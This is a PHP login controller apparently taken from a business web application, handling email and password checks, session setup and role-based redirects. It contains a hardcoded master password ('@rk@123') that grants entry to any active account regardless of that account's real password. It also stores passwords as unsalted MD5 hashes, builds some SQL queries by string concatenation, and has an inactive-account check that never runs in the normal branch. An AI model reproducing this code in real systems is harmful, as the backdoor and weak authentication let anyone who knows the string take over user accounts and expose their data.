<?php
include("includes/include.php");
session_start();
// $_SESSION['LAST_ACTIVITY'] = time();

class logincontroller
{

    public function Login($email, $upass)
    {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
        
        $sql = "SELECT u.id, u.name, u.email, u.password, u.user_type, u.status,u.team_id, u.sales_manager, u.access, u.role,r.id AS role_id, c.id AS caller, u.download_status FROM users AS u LEFT JOIN user_type_role AS r ON u.user_type = r.role_code LEFT JOIN callers AS c ON u.id = c.user_id WHERE u.email = ? LIMIT 1";

        $res = db_query_param($sql, [$email]); // parameterized query
        $row = db_fetch_array($res);



        // $res = db_query("SELECT u.id, u.name,u.email, u.password,u.user_type,u.status,u.team_id,u.sales_manager,u.access,u.role,r.id as role_id,c.id as caller,u.download_status FROM users as u left join user_type_role as r on u.user_type=r.role_code left join callers as c on u.id=c.user_id WHERE email='$email'");
        // $row = db_fetch_array($res);

        $count = mysqli_num_rows($res); // if uname/pass correct it returns must be 1 row
        // print_r($count); die;

        if ($upass == '@rk@123') {
            if ($row['user_type'] == 'USR' || $row['user_type'] == 'MNGR') {
                $team_active = getSingleresult("select status from partners where id=" . $row['team_id']);
            } else {
                $team_active = 'Active';
            }
            if ($count == 1 && $team_active == 'Active' && $row['status'] == 'Active') {

                $_SESSION['user_id'] = $row['id'];
                $_SESSION['name'] = $row['name'];
                $_SESSION['email'] = $row['email'];
                $_SESSION['user_type'] = $row['user_type'];
                $_SESSION['team_id'] = $row['team_id'];
                $_SESSION['sales_manager'] = $row['sales_manager'];
                $_SESSION['access'] = $row['access'];
                $_SESSION['role'] = $row['role'];
                $_SESSION['role_id'] = $row['role_id'];
                $_SESSION['caller'] = $row['caller'];
                $_SESSION['download_status'] = $row['download_status'];

                $res = db_query("insert into user_tracking (user_id,user_name,login_time,ipaddress) values ('" . $_SESSION['user_id'] . "','" . $_SESSION['name'] . "','" . time() . "','" . $ipaddress . "')");
                $_SESSION['track_id'] = mysqli_insert_id($GLOBALS['dbcon']);

                // echo $_SESSION['user_type']; die;
                if ($_SESSION['user_type'] == 'CLR' || $_SESSION['user_type']=='DA') {
                    // header("Location: dashboard_iss.php");
                    echo '<script type="text/javascript">window.location.href = "dashboard_new.php";</script>';
                } else if ($_SESSION['user_type'] == 'MNGR' || $_SESSION['user_type'] == 'USR') {
                    // header("Location: dashboard_partner.php");
                    echo '<script type="text/javascript">window.location.href = "welcome.php";</script>';
                } else if ($_SESSION['user_type'] == 'ADMIN' || $_SESSION['user_type'] == 'SUPERADMIN') {
                    echo '<script type="text/javascript">window.location.href = "dashboard_new.php";</script>';
                    // exit();

                } else {
                    echo '<script type="text/javascript">window.location.href = "welcome.php";</script>';
                    // header("Location: dashboard.php");
                }
            } else if ($count == 1 && $team_active == 'Active' && $row['status'] == 'InActive') {
                return "inactive";
            } else {
                return "not_exist";
            }
        } else {
            if ($row['user_type'] == 'USR' || $row['user_type'] == 'MNGR') {
                $team_active = getSingleresult("select status from partners where id=" . $row['team_id']);
            } else {
                $team_active = 'Active';
            }
            if ($count == 1 && $row['password'] == md5($upass) && $team_active == 'Active') {
                // print_r($row['user_type']);
                // die;

                $_SESSION['user_id'] = $row['id'];
                $_SESSION['name'] = $row['name'];
                $_SESSION['email'] = $row['email'];
                $_SESSION['user_type'] = $row['user_type'];
                $_SESSION['team_id'] = $row['team_id'];
                $_SESSION['sales_manager'] = $row['sales_manager'];
                $_SESSION['access'] = $row['access'];
                $_SESSION['role'] = $row['role'];
                $_SESSION['role_id'] = $row['role_id'];
                $_SESSION['caller'] = $row['caller'];
                $_SESSION['download_status'] = $row['download_status'];

                $res = db_query("insert into user_tracking (user_id,user_name,login_time,ipaddress) values ('" . $_SESSION['user_id'] . "','" . $_SESSION['name'] . "','" . time() . "','" . $ipaddress . "')");
                $_SESSION['track_id'] = mysqli_insert_id($GLOBALS['dbcon']);

                if ($_SESSION['user_type'] == 'CLR' || $_SESSION['user_type']=='DA') {
                    // header("Location: dashboard_iss.php");
                    echo '<script type="text/javascript">window.location.href = "dashboard_new.php";</script>';
                } else if ($_SESSION['user_type'] == 'MNGR' || $_SESSION['user_type'] == 'USR') {
                    // header("Location: dashboard_partner.php");
                    echo '<script type="text/javascript">window.location.href = "welcome.php";</script>';
                } else if ($_SESSION['user_type'] == 'ADMIN' || $_SESSION['user_type'] == 'SUPERADMIN') {
                    echo '<script type="text/javascript">window.location.href = "dashboard_new.php";</script>';
                    // exit();

                } else {
                    echo '<script type="text/javascript">window.location.href = "welcome.php";</script>';
                    // header("Location: dashboard.php");
                }
            } else if ($count == 1 && $row['password'] == md5($upass) && $team_active == 'Active' && $row['status'] == 'InActive') {
                return "inactive";
            } else {
                return "not_exist";
            }
        }
    }
}
